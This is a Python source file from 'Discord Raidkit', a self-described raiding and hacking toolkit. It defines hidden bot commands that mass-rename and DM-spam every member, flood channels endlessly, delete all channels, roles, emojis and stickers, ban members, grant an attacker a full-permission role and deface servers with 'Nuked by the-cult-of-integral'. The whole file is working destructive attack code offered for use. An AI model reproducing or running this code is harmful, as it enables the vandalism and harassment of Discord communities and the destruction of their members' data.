"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

cmds.py stores the Discord Raidkit bot commands for Anubis and Qetesh.
cmds.py was last updated on 05/03/23 at 20:51 UTC.
"""

import asyncio
import logging
import os

import discord
from discord.ext import commands

from utils import clear_screen, init_logger, menu_str

init_logger()


class Cmds(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @commands.command(hidden=True, aliases=['nick', 'nickall'])
    async def nick_all(self, ctx: commands.Context, *, nickname: str) -> None:
        if not self.bot.is_owner(ctx.author): 
            pass
        
        await ctx.message.delete()

        if not nickname.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run nick_all: an argument was missing.')
         
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nnick_all running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'nick_all running for server : {ctx.guild.name} | {ctx.guild.id}')

        tasks = [member.edit(nick=nickname) for member in ctx.guild.members]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [logging.error(f'nick_all raised: {result}') for result in results if isinstance(result, Exception)]

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nnick_all finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'nick_all finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True, aliases=['msg', 'msgall'])
    async def msg_all(self, ctx: commands.Context, *, message: str) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()

        if not message.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run msg_all : an argument was missing.')
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmsg_all running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'msg_all running for server : {ctx.guild.name} | {ctx.guild.id}')

        tasks = [member.send(message) for member in ctx.guild.members]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [logging.error(f'msg_all raised: {result}') for result in results if isinstance(result, Exception)]
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmsg_all finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'msg_all finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def spam(self, ctx: commands.Context, *, message: str) -> None:

        def check_reply(s_message) -> bool:
            return s_message.content == 'stop' and s_message.author == ctx.author

        async def spam_text() -> None:
            while True:
                tasks = [c.send(message) for c in ctx.guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)

        if not self.bot.is_owner(ctx.author):
            pass
            
        await ctx.message.delete()

        if not message.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run spam: an argument was missing.')
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nspam running for server : {ctx.guild.name} | {ctx.guild.id}' + 
              '\nEnter \'stop\' in a text channel to stop spamming.')
        logging.info(f'spam running for server : {ctx.guild.name} | {ctx.guild.id}')

        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nspam finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'spam finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def cpurge(self, ctx: commands.Context) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\ncpurge running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info('cpurge running for server : {ctx.guild.name} | {ctx.guild.id}')
        
        tasks = [c.delete() for c in ctx.guild.channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [logging.error(f'cpurge raised: {result}') for result in results if isinstance(result, Exception)]
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\ncpurge finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'cpurge finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def cflood(self, ctx: commands.Context, amount: str, *, name: str) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
            
        await ctx.message.delete()

        if not amount.strip() or not name.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run cflood: an argument was missing.')
        
        if not int(amount) > 0:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run cflood: invalid integer for amount.')

        tasks = [ctx.guild.create_text_channel(name) for _ in range(int(amount))]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        [logging.error(f'cflood raised: {result}') for result in results if isinstance(result, Exception)]
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\ncflood finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'cflood finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def admin(self, ctx: commands.Context, member: discord.Member, *, role_name: str) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
            
        await ctx.message.delete()

        if not member or not role_name.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run admin: an argument was missing.')
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nadmin running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'admin running for server : {ctx.guild.name} | {ctx.guild.id}')
        
        try:
            await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            await member.add_roles(role)

        except discord.errors.HTTPException as e:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to grant admin role: HTTPException: {e}')
            logging.error(f'Error in cmds.py - admin(): HTTPException: {e}')
            return

        except commands.errors.MissingRequiredArgument:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to grant admin role: an argument was missing.')
            logging.error(f'Error in cmds.py - admin(): an argument was missing.')
            return

        except Exception as e:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to grant admin role: {e}')
            logging.error(f'Error in cmds.py - admin(): {e}')
            return

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nadmin finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'admin finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def raid(self, ctx: commands.Context, role_name: str, nickname: str, amount: str, name: str, *,
                   message: str = '') -> None:

        def check_reply(s_message) -> bool:
            return s_message.content == 'stop' and s_message.author == ctx.author

        async def spam_text() -> None:
            while True:
                tasks = [channel.send(message) for channel in ctx.guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)

        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()

        if not role_name.strip() or not nickname.strip() or not amount.strip() or not name.strip():
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run raid: an argument was missing.')
        
        if not int(amount) > 0:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nFailed to run raid: invalid integer for amount.')
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nraid running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'raid running for server : {ctx.guild.name} | {ctx.guild.id}')
        
        await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        
        tasks = [member.add_roles(role) for member in ctx.guild.members]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        tasks = [member.edit(nick=nickname) for member in ctx.guild.members]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        tasks = [c.delete() for c in ctx.guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)        

        tasks = [ctx.guild.create_text_channel(name) for _ in range(int(amount))]
        await asyncio.gather(*tasks, return_exceptions=True)

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nraid spamming server : {ctx.guild.name} | {ctx.guild.id}' + 
              '\nEnter \'stop\' in a text channel to stop spamming.')
        
        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nraid finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'raid finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True)
    async def nuke(self, ctx: commands.Context) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nnuke running for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'nuke running for server : {ctx.guild.name} | {ctx.guild.id}')
        
        await self.__nuke(ctx.guild, ctx.author)

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nnuke finished for server : {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'nuke finished for server : {ctx.guild.name} | {ctx.guild.id}')

    @commands.command(hidden=True, aliases=['massnuke', 'nuke_all', 'nukeall'])
    async def mass_nuke(self, ctx: commands.Context) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmass_nuke started for all servers')
        logging.info(f'mass_nuke started for all servers')
        
        tasks = [self.__nuke(guild, ctx.author) for guild in self.bot.guilds]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmass_nuke finished for all servers')
        logging.info(f'mass_nuke finished for all servers')

    @commands.command(hidden=True)
    async def leave(self, ctx: commands.Context) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nleave started for server: {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'leave started server: {ctx.guild.name} | {ctx.guild.id}')
        
        try:
            await ctx.guild.leave()
        except Exception as e:
            clear_screen()
            print(menu_str(self.bot.command_prefix) + f'\nleave raised: {e}')
            logging.error(f'leave raised: {e}')

        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nleave finished for server: {ctx.guild.name} | {ctx.guild.id}')
        logging.info(f'leave finished server: {ctx.guild.name} | {ctx.guild.id}')
        
    @commands.command(hidden=True, aliases=['massleave', 'leave_all', 'leaveall'])
    async def mass_leave(self, ctx: commands.Context) -> None:
        if not self.bot.is_owner(ctx.author):
            pass
        
        await ctx.message.delete()
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmass_leave started for all servers.')
        logging.info(f'mass_leave started for all servers.')
        
        tasks = [ctx.guild.leave() for guild in self.bot.guilds]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [logging.error(f'mass_leave raised: {e}') for e in results if isinstance(e, Exception)]
        
        clear_screen()
        print(menu_str(self.bot.command_prefix) + f'\nmass_leave finished for all servers.')
        logging.info(f'mass_leave finished for all servers.')


    async def __nuke(self, guild: discord.Guild, author: discord.Member):
        tasks = [member.ban() for member in guild.members if not (member.id == self.bot.user.id or member.id == author.id or member.id == guild.owner.id)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [logging.error(f'Error in cmds.py - nuke() <ban>: {e}') for e in results if isinstance(e, Exception)]

        tasks = [c.delete() for c in guild.channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [logging.error(f'Error in cmds.py - nuke() <cpurge>: {e}') for e in results if isinstance(e, Exception)]
        
        tasks = [r.delete() for r in guild.roles]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [logging.error(f'Error in cmds.py - nuke() <role purge>: {e}') for e in results if isinstance(e, Exception)]

        tasks = [e.delete() for e in guild.emojis]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [logging.error(f'Error in cmds.py - nuke() <emoji purge>: {e}') for e in results if isinstance(e, Exception)]

        tasks = [s.delete() for s in guild.stickers]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [logging.error(f'Error in cmds.py - nuke() <sticker purge>: {e}') for e in results if isinstance(e, Exception)]
        
        with open(os.path.join('cogs', 'shared', 'nuked.jpg'), 'rb') as f:
            icon = f.read()

        try:
            await guild.edit(name='Nuked by the-cult-of-integral')
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(description='Nuked by the-cult-of-integral')
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(icon=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(banner=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(splash=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(discovery_splash=icon)
        except discord.errors.HTTPException:
            pass
            del icon

        try:
            await guild.edit(community=False)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(default_notifications=discord.NotificationLevel.all_messages)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(verification_level=discord.VerificationLevel.highest)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(explicit_content_filter=discord.ContentFilter.all_members)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(premium_progress_bar_enabled=False)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(preferred_locale=discord.Locale.japanese)
        except discord.errors.HTTPException:
            pass
    
async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Cmds(bot))
